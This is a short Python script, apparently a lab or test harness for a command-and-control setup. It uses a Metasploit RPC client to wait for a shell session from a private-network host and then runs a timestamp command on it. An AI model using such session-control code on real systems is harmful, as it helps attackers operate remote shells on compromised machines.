from time import sleep
from c2_settings import MSF_SERVER, MSF_PWD
from pymetasploit.msfrpc import MsfRpcClient
from stage2.external_c2 import msf_wait_for_session, msf_get_timestamp

client = MsfRpcClient(MSF_PWD, server=MSF_SERVER,ssl=False)
id = msf_wait_for_session.run(client, '192.168.2.129', meterpreter=False)
shell = client.sessions.session(id)
if(shell is None):
    print("time out, no shell :(")
else:
    print(msf_get_timestamp.run(client, id))
    
pass # for breakpoint